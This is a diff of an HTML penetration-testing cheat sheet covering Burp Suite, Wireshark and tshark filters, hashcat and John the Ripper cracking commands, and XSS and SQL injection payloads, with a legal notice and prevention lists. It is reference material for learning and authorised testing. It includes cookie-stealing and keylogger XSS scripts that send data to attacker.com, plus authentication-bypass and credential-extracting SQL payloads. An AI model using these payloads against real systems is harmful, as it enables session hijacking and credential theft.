-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# 1. Configure Browser Proxy&lt;/span&gt;
-&lt;span class="cmm"&gt;# Set browser proxy to 127.0.0.1:8080&lt;/span&gt;
-&lt;span class="cmm"&gt;# Install Burp CA certificate for HTTPS interception&lt;/span&gt;
-&lt;span class="cmm"&gt;# http://burpsuite/cert&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># 1. Configure Browser Proxy</span>
+<span class="cmm"># Set browser proxy to 127.0.0.1:8080</span>
+<span class="cmm"># Install Burp CA certificate for HTTPS interception</span>
+<span class="cmm"># http://burpsuite/cert</span>
 
-&lt;span class="cmm"&gt;# 2. Intercept and Modify Requests&lt;/span&gt;
-&lt;span class="cmm"&gt;# Turn Intercept ON in Proxy tab&lt;/span&gt;
-&lt;span class="cmm"&gt;# Navigate to target in browser&lt;/span&gt;
-&lt;span class="cmm"&gt;# Modify request in Intercept tab, then Forward or Drop&lt;/span&gt;
+<span class="cmm"># 2. Intercept and Modify Requests</span>
+<span class="cmm"># Turn Intercept ON in Proxy tab</span>
+<span class="cmm"># Navigate to target in browser</span>
+<span class="cmm"># Modify request in Intercept tab, then Forward or Drop</span>
 
-&lt;span class="cmm"&gt;# 3. Spider/Crawl the Application&lt;/span&gt;
-&lt;span class="cmm"&gt;# Right-click target -&gt; "Scan" -&gt; "Crawl"&lt;/span&gt;
-&lt;span class="cmm"&gt;# Or use Target -&gt; Site Map to manually explore&lt;/span&gt;
+<span class="cmm"># 3. Spider/Crawl the Application</span>
+<span class="cmm"># Right-click target -> "Scan" -> "Crawl"</span>
+<span class="cmm"># Or use Target -> Site Map to manually explore</span>
 
-&lt;span class="cmm"&gt;# 4. Fuzzing with Intruder&lt;/span&gt;
-&lt;span class="cmm"&gt;# Right-click request -&gt; "Send to Intruder"&lt;/span&gt;
-&lt;span class="cmm"&gt;# Set payload positions with § markers&lt;/span&gt;
-&lt;span class="cmm"&gt;# Choose attack type: Sniper, Battering Ram, Pitchfork, Cluster Bomb&lt;/span&gt;
-&lt;span class="cmm"&gt;# Load payloads and start attack&lt;/span&gt;
+<span class="cmm"># 4. Fuzzing with Intruder</span>
+<span class="cmm"># Right-click request -> "Send to Intruder"</span>
+<span class="cmm"># Set payload positions with § markers</span>
+<span class="cmm"># Choose attack type: Sniper, Battering Ram, Pitchfork, Cluster Bomb</span>
+<span class="cmm"># Load payloads and start attack</span>
 
-&lt;span class="cmm"&gt;# 5. SQL Injection Testing&lt;/span&gt;
-&lt;span class="cmm"&gt;# In Repeater, test inputs with:&lt;/span&gt;
-&lt;span class="cmm"&gt;# ' OR '1'='1&lt;/span&gt;
-&lt;span class="cmm"&gt;# ' UNION SELECT null,null--&lt;/span&gt;
-&lt;span class="cmm"&gt;# ' AND 1=1--&lt;/span&gt;
-&lt;span class="cmm"&gt;# ' AND 1=2--&lt;/span&gt;
+<span class="cmm"># 5. SQL Injection Testing</span>
+<span class="cmm"># In Repeater, test inputs with:</span>
+<span class="cmm"># ' OR '1'='1</span>
+<span class="cmm"># ' UNION SELECT null,null--</span>
+<span class="cmm"># ' AND 1=1--</span>
+<span class="cmm"># ' AND 1=2--</span>
 
-&lt;span class="cmm"&gt;# 6. XSS Testing&lt;/span&gt;
-&lt;span class="cmm"&gt;# &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/span&gt;
-&lt;span class="cmm"&gt;# &lt;img src=x onerror=alert('XSS')&gt;&lt;/span&gt;
-&lt;span class="cmm"&gt;# javascript:alert('XSS')&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># 6. XSS Testing</span>
+<span class="cmm"># &lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+<span class="cmm"># &lt;img src=x onerror=alert('XSS')&gt;</span>
+<span class="cmm"># javascript:alert('XSS')</span></div>
         </div>
       </section>
 
@@ -2005,94 +2005,94 @@ EOF&lt;/div&gt;
         <h3>Capture Filters (BPF Syntax)</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Capture only HTTP traffic&lt;/span&gt;
-&lt;span class="var"&gt;tcp port 80&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Capture only HTTP traffic</span>
+<span class="var">tcp port 80</span>
 
-&lt;span class="cmm"&gt;# Capture traffic to/from a specific host&lt;/span&gt;
-&lt;span class="var"&gt;host 192.168.1.10&lt;/span&gt;
+<span class="cmm"># Capture traffic to/from a specific host</span>
+<span class="var">host 192.168.1.10</span>
 
-&lt;span class="cmm"&gt;# Capture traffic on a specific network&lt;/span&gt;
-&lt;span class="var"&gt;net 192.168.1.0/24&lt;/span&gt;
+<span class="cmm"># Capture traffic on a specific network</span>
+<span class="var">net 192.168.1.0/24</span>
 
-&lt;span class="cmm"&gt;# Capture ICMP traffic only&lt;/span&gt;
-&lt;span class="var"&gt;icmp&lt;/span&gt;
+<span class="cmm"># Capture ICMP traffic only</span>
+<span class="var">icmp</span>
 
-&lt;span class="cmm"&gt;# Capture SSH traffic excluding one host&lt;/span&gt;
-&lt;span class="var"&gt;tcp port 22 and not host 192.168.1.5&lt;/span&gt;
+<span class="cmm"># Capture SSH traffic excluding one host</span>
+<span class="var">tcp port 22 and not host 192.168.1.5</span>
 
-&lt;span class="cmm"&gt;# Capture DNS queries&lt;/span&gt;
-&lt;span class="var"&gt;udp port 53&lt;/span&gt;
+<span class="cmm"># Capture DNS queries</span>
+<span class="var">udp port 53</span>
 
-&lt;span class="cmm"&gt;# Capture ARP traffic&lt;/span&gt;
-&lt;span class="var"&gt;arp&lt;/span&gt;
+<span class="cmm"># Capture ARP traffic</span>
+<span class="var">arp</span>
 
-&lt;span class="cmm"&gt;# Capture TLS/SSL handshakes&lt;/span&gt;
-&lt;span class="var"&gt;tcp port 443 and tcp[13] & 2 != 0&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Capture TLS/SSL handshakes</span>
+<span class="var">tcp port 443 and tcp[13] & 2 != 0</span></div>
         </div>
         <h3>Display Filters</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Filter by IP address&lt;/span&gt;
-&lt;span class="var"&gt;ip.addr == 192.168.1.10&lt;/span&gt;
-&lt;span class="var"&gt;ip.src == 192.168.1.10&lt;/span&gt;
-&lt;span class="var"&gt;ip.dst == 192.168.1.10&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Filter by IP address</span>
+<span class="var">ip.addr == 192.168.1.10</span>
+<span class="var">ip.src == 192.168.1.10</span>
+<span class="var">ip.dst == 192.168.1.10</span>
 
-&lt;span class="cmm"&gt;# Filter by protocol&lt;/span&gt;
-&lt;span class="var"&gt;http&lt;/span&gt;
-&lt;span class="var"&gt;dns&lt;/span&gt;
-&lt;span class="var"&gt;tcp&lt;/span&gt;
-&lt;span class="var"&gt;icmp&lt;/span&gt;
+<span class="cmm"># Filter by protocol</span>
+<span class="var">http</span>
+<span class="var">dns</span>
+<span class="var">tcp</span>
+<span class="var">icmp</span>
 
-&lt;span class="cmm"&gt;# Filter by port&lt;/span&gt;
-&lt;span class="var"&gt;tcp.port == 80&lt;/span&gt;
-&lt;span class="var"&gt;udp.port == 53&lt;/span&gt;
+<span class="cmm"># Filter by port</span>
+<span class="var">tcp.port == 80</span>
+<span class="var">udp.port == 53</span>
 
-&lt;span class="cmm"&gt;# Filter HTTP requests&lt;/span&gt;
-&lt;span class="var"&gt;http.request&lt;/span&gt;
-&lt;span class="var"&gt;http.request.method == "GET"&lt;/span&gt;
-&lt;span class="var"&gt;http.request.method == "POST"&lt;/span&gt;
-&lt;span class="var"&gt;http.host contains "example.com"&lt;/span&gt;
+<span class="cmm"># Filter HTTP requests</span>
+<span class="var">http.request</span>
+<span class="var">http.request.method == "GET"</span>
+<span class="var">http.request.method == "POST"</span>
+<span class="var">http.host contains "example.com"</span>
 
-&lt;span class="cmm"&gt;# Filter DNS queries&lt;/span&gt;
-&lt;span class="var"&gt;dns.qry.name contains "malicious"&lt;/span&gt;
+<span class="cmm"># Filter DNS queries</span>
+<span class="var">dns.qry.name contains "malicious"</span>
 
-&lt;span class="cmm"&gt;# Filter by TCP flags&lt;/span&gt;
-&lt;span class="var"&gt;tcp.flags.syn == 1 and tcp.flags.ack == 0&lt;/span&gt;   &lt;span class="cmm"&gt;# SYN scan&lt;/span&gt;
-&lt;span class="var"&gt;tcp.flags.reset == 1&lt;/span&gt;                            &lt;span class="cmm"&gt;# RST packets&lt;/span&gt;
+<span class="cmm"># Filter by TCP flags</span>
+<span class="var">tcp.flags.syn == 1 and tcp.flags.ack == 0</span>   <span class="cmm"># SYN scan</span>
+<span class="var">tcp.flags.reset == 1</span>                            <span class="cmm"># RST packets</span>
 
-&lt;span class="cmm"&gt;# Filter SSL/TLS&lt;/span&gt;
-&lt;span class="var"&gt;ssl.handshake.type == 1&lt;/span&gt;    &lt;span class="cmm"&gt;# Client Hello&lt;/span&gt;
-&lt;span class="var"&gt;ssl.handshake.type == 2&lt;/span&gt;    &lt;span class="cmm"&gt;# Server Hello&lt;/span&gt;
-&lt;span class="var"&gt;tls.handshake.extensions_server_name contains "example.com"&lt;/span&gt;
+<span class="cmm"># Filter SSL/TLS</span>
+<span class="var">ssl.handshake.type == 1</span>    <span class="cmm"># Client Hello</span>
+<span class="var">ssl.handshake.type == 2</span>    <span class="cmm"># Server Hello</span>
+<span class="var">tls.handshake.extensions_server_name contains "example.com"</span>
 
-&lt;span class="cmm"&gt;# Filter suspicious traffic&lt;/span&gt;
-&lt;span class="var"&gt;tcp.analysis.retransmission&lt;/span&gt;
-&lt;span class="var"&gt;tcp.analysis.duplicate_ack&lt;/span&gt;
-&lt;span class="var"&gt;tcp.analysis.lost_segment&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Filter suspicious traffic</span>
+<span class="var">tcp.analysis.retransmission</span>
+<span class="var">tcp.analysis.duplicate_ack</span>
+<span class="var">tcp.analysis.lost_segment</span></div>
         </div>
         <h3>Tshark (Command-Line Wireshark)</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Capture and display packets&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -i eth0
+          <div class="code-block"><span class="cmm"># Capture and display packets</span>
+<span class="fn">tshark</span> -i eth0
 
-&lt;span class="cmm"&gt;# Capture to file&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -i eth0 -w capture.pcap
+<span class="cmm"># Capture to file</span>
+<span class="fn">tshark</span> -i eth0 -w capture.pcap
 
-&lt;span class="cmm"&gt;# Read from file with filter&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -r capture.pcap -Y "http.request"
+<span class="cmm"># Read from file with filter</span>
+<span class="fn">tshark</span> -r capture.pcap -Y "http.request"
 
-&lt;span class="cmm"&gt;# Extract HTTP URIs&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
+<span class="cmm"># Extract HTTP URIs</span>
+<span class="fn">tshark</span> -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
 
-&lt;span class="cmm"&gt;# Extract DNS queries&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
+<span class="cmm"># Extract DNS queries</span>
+<span class="fn">tshark</span> -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
 
-&lt;span class="cmm"&gt;# Top talkers&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -r capture.pcap -q -z conv,ip
+<span class="cmm"># Top talkers</span>
+<span class="fn">tshark</span> -r capture.pcap -q -z conv,ip
 
-&lt;span class="cmm"&gt;# Protocol hierarchy&lt;/span&gt;
-&lt;span class="fn"&gt;tshark&lt;/span&gt; -r capture.pcap -q -z io,phs&lt;/div&gt;
+<span class="cmm"># Protocol hierarchy</span>
+<span class="fn">tshark</span> -r capture.pcap -q -z io,phs</div>
         </div>
       </section>
 
@@ -2104,69 +2104,69 @@ EOF&lt;/div&gt;
         <h3>Hashcat</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Identify hash type&lt;/span&gt;
-&lt;span class="fn"&gt;hashid&lt;/span&gt; "5f4dcc3b5aa765d61d8327deb882cf99"
+          <div class="code-block"><span class="cmm"># Identify hash type</span>
+<span class="fn">hashid</span> "5f4dcc3b5aa765d61d8327deb882cf99"
 
-&lt;span class="cmm"&gt;# List supported hash types&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; --help | grep -i ntlm
+<span class="cmm"># List supported hash types</span>
+<span class="fn">hashcat</span> --help | grep -i ntlm
 
-&lt;span class="cmm"&gt;# Crack MD5 hash with wordlist&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+<span class="cmm"># Crack MD5 hash with wordlist</span>
+<span class="fn">hashcat</span> -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 
-&lt;span class="cmm"&gt;# Crack NTLM hash&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
+<span class="cmm"># Crack NTLM hash</span>
+<span class="fn">hashcat</span> -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
 
-&lt;span class="cmm"&gt;# Crack WPA/WPA2 handshake&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+<span class="cmm"># Crack WPA/WPA2 handshake</span>
+<span class="fn">hashcat</span> -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
 
-&lt;span class="cmm"&gt;# Crack with rules (mutate wordlist)&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+<span class="cmm"># Crack with rules (mutate wordlist)</span>
+<span class="fn">hashcat</span> -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
-&lt;span class="cmm"&gt;# Brute force (mask attack)&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l   &lt;span class="cmm"&gt;# 8 lowercase letters&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d?d   &lt;span class="cmm"&gt;# 1 upper, 4 lower, 3 digits&lt;/span&gt;
+<span class="cmm"># Brute force (mask attack)</span>
+<span class="fn">hashcat</span> -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l   <span class="cmm"># 8 lowercase letters</span>
+<span class="fn">hashcat</span> -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d?d   <span class="cmm"># 1 upper, 4 lower, 3 digits</span>
 
-&lt;span class="cmm"&gt;# Mask characters:&lt;/span&gt;
-&lt;span class="cmm"&gt;# ?l = lowercase, ?u = uppercase, ?d = digit&lt;/span&gt;
-&lt;span class="cmm"&gt;# ?s = special, ?a = all, ?h = hex lowercase&lt;/span&gt;
+<span class="cmm"># Mask characters:</span>
+<span class="cmm"># ?l = lowercase, ?u = uppercase, ?d = digit</span>
+<span class="cmm"># ?s = special, ?a = all, ?h = hex lowercase</span>
 
-&lt;span class="cmm"&gt;# Use GPU acceleration&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt /usr/share/wordlists/rockyou.txt -O   &lt;span class="cmm"&gt;# Optimized kernels&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt /usr/share/wordlists/rockyou.txt -d 1   &lt;span class="cmm"&gt;# Use specific GPU device&lt;/span&gt;
+<span class="cmm"># Use GPU acceleration</span>
+<span class="fn">hashcat</span> -m 0 hash.txt /usr/share/wordlists/rockyou.txt -O   <span class="cmm"># Optimized kernels</span>
+<span class="fn">hashcat</span> -m 0 hash.txt /usr/share/wordlists/rockyou.txt -d 1   <span class="cmm"># Use specific GPU device</span>
 
-&lt;span class="cmm"&gt;# Show cracked passwords&lt;/span&gt;
-&lt;span class="fn"&gt;hashcat&lt;/span&gt; -m 0 hash.txt --show&lt;/div&gt;
+<span class="cmm"># Show cracked passwords</span>
+<span class="fn">hashcat</span> -m 0 hash.txt --show</div>
         </div>
         <h3>John the Ripper</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Crack Linux password hashes (/etc/shadow)&lt;/span&gt;
-&lt;span class="fn"&gt;unshadow&lt;/span&gt; /etc/passwd /etc/shadow &gt; hashes.txt
-&lt;span class="fn"&gt;john&lt;/span&gt; hashes.txt
+          <div class="code-block"><span class="cmm"># Crack Linux password hashes (/etc/shadow)</span>
+<span class="fn">unshadow</span> /etc/passwd /etc/shadow > hashes.txt
+<span class="fn">john</span> hashes.txt
 
-&lt;span class="cmm"&gt;# Crack with wordlist&lt;/span&gt;
-&lt;span class="fn"&gt;john&lt;/span&gt; --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+<span class="cmm"># Crack with wordlist</span>
+<span class="fn">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
-&lt;span class="cmm"&gt;# Crack with rules&lt;/span&gt;
-&lt;span class="fn"&gt;john&lt;/span&gt; --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
+<span class="cmm"># Crack with rules</span>
+<span class="fn">john</span> --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
 
-&lt;span class="cmm"&gt;# Show cracked passwords&lt;/span&gt;
-&lt;span class="fn"&gt;john&lt;/span&gt; --show hashes.txt
+<span class="cmm"># Show cracked passwords</span>
+<span class="fn">john</span> --show hashes.txt
 
-&lt;span class="cmm"&gt;# Crack ZIP file&lt;/span&gt;
-&lt;span class="fn"&gt;zip2john&lt;/span&gt; protected.zip &gt; zip.hash
-&lt;span class="fn"&gt;john&lt;/span&gt; zip.hash
+<span class="cmm"># Crack ZIP file</span>
+<span class="fn">zip2john</span> protected.zip > zip.hash
+<span class="fn">john</span> zip.hash
 
-&lt;span class="cmm"&gt;# Crack PDF&lt;/span&gt;
-&lt;span class="fn"&gt;pdf2john&lt;/span&gt; protected.pdf &gt; pdf.hash
-&lt;span class="fn"&gt;john&lt;/span&gt; pdf.hash
+<span class="cmm"># Crack PDF</span>
+<span class="fn">pdf2john</span> protected.pdf > pdf.hash
+<span class="fn">john</span> pdf.hash
 
-&lt;span class="cmm"&gt;# Crack SSH key&lt;/span&gt;
-&lt;span class="fn"&gt;ssh2john&lt;/span&gt; id_rsa &gt; ssh.hash
-&lt;span class="fn"&gt;john&lt;/span&gt; ssh.hash
+<span class="cmm"># Crack SSH key</span>
+<span class="fn">ssh2john</span> id_rsa > ssh.hash
+<span class="fn">john</span> ssh.hash
 
-&lt;span class="cmm"&gt;# Incremental (brute force) mode&lt;/span&gt;
-&lt;span class="fn"&gt;john&lt;/span&gt; --incremental hashes.txt&lt;/div&gt;
+<span class="cmm"># Incremental (brute force) mode</span>
+<span class="fn">john</span> --incremental hashes.txt</div>
         </div>
         <div class="explanation warning">
           <strong>Legal Notice:</strong> Only crack passwords for which you have explicit authorization. Unauthorized password cracking is illegal. These tools are intended for security auditing, penetration testing with permission, and recovering your own forgotten passwords.
@@ -2213,29 +2213,29 @@ EOF&lt;/div&gt;
         <h3>XSS Payloads</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">html</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Basic XSS payloads&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;script&lt;/span&gt;&gt;alert(&lt;span class="str"&gt;'XSS'&lt;/span&gt;)&lt;/&lt;span class="kw"&gt;script&lt;/span&gt;&gt;
-&lt;&lt;span class="kw"&gt;img&lt;/span&gt; &lt;span class="var"&gt;src&lt;/span&gt;=&lt;span class="str"&gt;x&lt;/span&gt; &lt;span class="var"&gt;onerror&lt;/span&gt;=&lt;span class="str"&gt;alert('XSS')&lt;/span&gt;&gt;
-&lt;&lt;span class="kw"&gt;svg&lt;/span&gt; &lt;span class="var"&gt;onload&lt;/span&gt;=&lt;span class="str"&gt;alert('XSS')&lt;/span&gt;&gt;
-&lt;&lt;span class="kw"&gt;body&lt;/span&gt; &lt;span class="var"&gt;onload&lt;/span&gt;=&lt;span class="str"&gt;alert('XSS')&lt;/span&gt;&gt;
+          <div class="code-block"><span class="cmm"># Basic XSS payloads</span>
+&lt;<span class="kw">script</span>&gt;alert(<span class="str">'XSS'</span>)&lt;/<span class="kw">script</span>&gt;
+&lt;<span class="kw">img</span> <span class="var">src</span>=<span class="str">x</span> <span class="var">onerror</span>=<span class="str">alert('XSS')</span>&gt;
+&lt;<span class="kw">svg</span> <span class="var">onload</span>=<span class="str">alert('XSS')</span>&gt;
+&lt;<span class="kw">body</span> <span class="var">onload</span>=<span class="str">alert('XSS')</span>&gt;
 
-&lt;span class="cmm"&gt;# Cookie stealing&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;script&lt;/span&gt;&gt;&lt;span class="kw"&gt;new&lt;/span&gt; Image().src=&lt;span class="str"&gt;"http://attacker.com/steal?cookie="&lt;/span&gt;+document.cookie;&lt;/&lt;span class="kw"&gt;script&lt;/span&gt;&gt;
+<span class="cmm"># Cookie stealing</span>
+&lt;<span class="kw">script</span>&gt;<span class="kw">new</span> Image().src=<span class="str">"http://attacker.com/steal?cookie="</span>+document.cookie;&lt;/<span class="kw">script</span>&gt;
 
-&lt;span class="cmm"&gt;# Keylogger&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;script&lt;/span&gt;&gt;
-document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
-    &lt;span class="kw"&gt;new&lt;/span&gt; Image().src=&lt;span class="str"&gt;"http://attacker.com/keylog?k="&lt;/span&gt;+e.key;
+<span class="cmm"># Keylogger</span>
+&lt;<span class="kw">script</span>&gt;
+document.onkeypress = <span class="kw">function</span>(e) {
+    <span class="kw">new</span> Image().src=<span class="str">"http://attacker.com/keylog?k="</span>+e.key;
 }
-&lt;/&lt;span class="kw"&gt;script&lt;/span&gt;&gt;
+&lt;/<span class="kw">script</span>&gt;
 
-&lt;span class="cmm"&gt;# Bypass filters (encoding)&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;scr&lt;/span&gt;&lt;&lt;span class="kw"&gt;script&lt;/span&gt;&gt;&lt;span class="var"&gt;ipt&lt;/span&gt;&gt;alert(&lt;span class="str"&gt;'XSS'&lt;/span&gt;)&lt;/&lt;span class="kw"&gt;scr&lt;/span&gt;&lt;/&lt;span class="kw"&gt;script&lt;/span&gt;&gt;&lt;span class="var"&gt;ipt&lt;/span&gt;&gt;
-&lt;&lt;span class="kw"&gt;img&lt;/span&gt; &lt;span class="var"&gt;src&lt;/span&gt;=&lt;span class="str"&gt;"javascript:alert('XSS')"&lt;/span&gt;&gt;
-&lt;&lt;span class="kw"&gt;iframe&lt;/span&gt; &lt;span class="var"&gt;src&lt;/span&gt;=&lt;span class="str"&gt;"javascript:alert('XSS')"&lt;/span&gt;&gt;&lt;/&lt;span class="kw"&gt;iframe&lt;/span&gt;&gt;
+<span class="cmm"># Bypass filters (encoding)</span>
+&lt;<span class="kw">scr</span>&lt;<span class="kw">script</span>&gt;<span class="var">ipt</span>&gt;alert(<span class="str">'XSS'</span>)&lt;/<span class="kw">scr</span>&lt;/<span class="kw">script</span>&gt;<span class="var">ipt</span>&gt;
+&lt;<span class="kw">img</span> <span class="var">src</span>=<span class="str">"javascript:alert('XSS')"</span>&gt;
+&lt;<span class="kw">iframe</span> <span class="var">src</span>=<span class="str">"javascript:alert('XSS')"</span>&gt;&lt;/<span class="kw">iframe</span>&gt;
 
-&lt;span class="cmm"&gt;# Polyglot (works in multiple contexts)&lt;/span&gt;
-&lt;span class="str"&gt;jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/span&gt;&lt;&lt;span class="kw"&gt;stYle&lt;/span&gt;&gt;/&lt;&lt;span class="kw"&gt;titLe&lt;/span&gt;&gt;/&lt;&lt;span class="kw"&gt;teXtarEa&lt;/span&gt;&gt;/&lt;&lt;span class="kw"&gt;scRipt&lt;/span&gt;&gt;/~!@$%#^&amp;*()_+-={}|[]:";'&lt;&gt;?,./&lt;/div&gt;
+<span class="cmm"># Polyglot (works in multiple contexts)</span>
+<span class="str">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</span>&lt;<span class="kw">stYle</span>&gt;/&lt;<span class="kw">titLe</span>&gt;/&lt;<span class="kw">teXtarEa</span>&gt;/&lt;<span class="kw">scRipt</span>&gt;/~!@$%#^&amp;*()_+-={}|[]:";'&lt;&gt;?,./</div>
         </div>
         <h3>XSS Prevention</h3>
         <ul>
@@ -2267,31 +2267,31 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         <h3>SQL Injection Payloads</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">sql</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Authentication bypass&lt;/span&gt;
-&lt;span class="str"&gt;' OR '1'='1' --&lt;/span&gt;
-&lt;span class="str"&gt;' OR '1'='1' /*&lt;/span&gt;
-&lt;span class="str"&gt;' OR 1=1#&lt;/span&gt;
-&lt;span class="str"&gt;admin' --&lt;/span&gt;
-&lt;span class="str"&gt;admin' #&lt;/span&gt;
-&lt;span class="str"&gt;' OR '1'='1' LIMIT 1 --&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Authentication bypass</span>
+<span class="str">' OR '1'='1' --</span>
+<span class="str">' OR '1'='1' /*</span>
+<span class="str">' OR 1=1#</span>
+<span class="str">admin' --</span>
+<span class="str">admin' #</span>
+<span class="str">' OR '1'='1' LIMIT 1 --</span>
 
-&lt;span class="cmm"&gt;# Union-based data extraction&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, username, password FROM users --&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, table_name, null FROM information_schema.tables --&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --&lt;/span&gt;
+<span class="cmm"># Union-based data extraction</span>
+<span class="str">' UNION SELECT null, username, password FROM users --</span>
+<span class="str">' UNION SELECT null, table_name, null FROM information_schema.tables --</span>
+<span class="str">' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --</span>
 
-&lt;span class="cmm"&gt;# Time-based blind SQLi (MySQL)&lt;/span&gt;
-&lt;span class="str"&gt;' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --&lt;/span&gt;
-&lt;span class="str"&gt;' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97,SLEEP(5),0) --&lt;/span&gt;
+<span class="cmm"># Time-based blind SQLi (MySQL)</span>
+<span class="str">' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --</span>
+<span class="str">' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97,SLEEP(5),0) --</span>
 
-&lt;span class="cmm"&gt;# Error-based (MySQL)&lt;/span&gt;
-&lt;span class="str"&gt;' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --&lt;/span&gt;
+<span class="cmm"># Error-based (MySQL)</span>
+<span class="str">' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --</span>
 
-&lt;span class="cmm"&gt;# Database fingerprinting&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, @@version, null --&lt;/span&gt;    &lt;span class="cmm"&gt;# MySQL&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, version(), null --&lt;/span&gt;     &lt;span class="cmm"&gt;# PostgreSQL&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, @@version, null --&lt;/span&gt;     &lt;span class="cmm"&gt;# MSSQL&lt;/span&gt;
-&lt;span class="str"&gt;' UNION SELECT null, sqlite_version(), null --&lt;/span&gt;  &lt;span class="cmm"&gt;# SQLite&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Database fingerprinting</span>
+<span class="str">' UNION SELECT null, @@version, null --</span>    <span class="cmm"># MySQL</span>
+<span class="str">' UNION SELECT null, version(), null --</span>     <span class="cmm"># PostgreSQL</span>
+<span class="str">' UNION SELECT null, @@version, null --</span>     <span class="cmm"># MSSQL</span>
+<span class="str">' UNION SELECT null, sqlite_version(), null --</span>  <span class="cmm"># SQLite</span></div>
         </div>
         <h3>SQL Injection Prevention</h3>
         <ul>
@@ -2303,20 +2303,20 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         </ul>
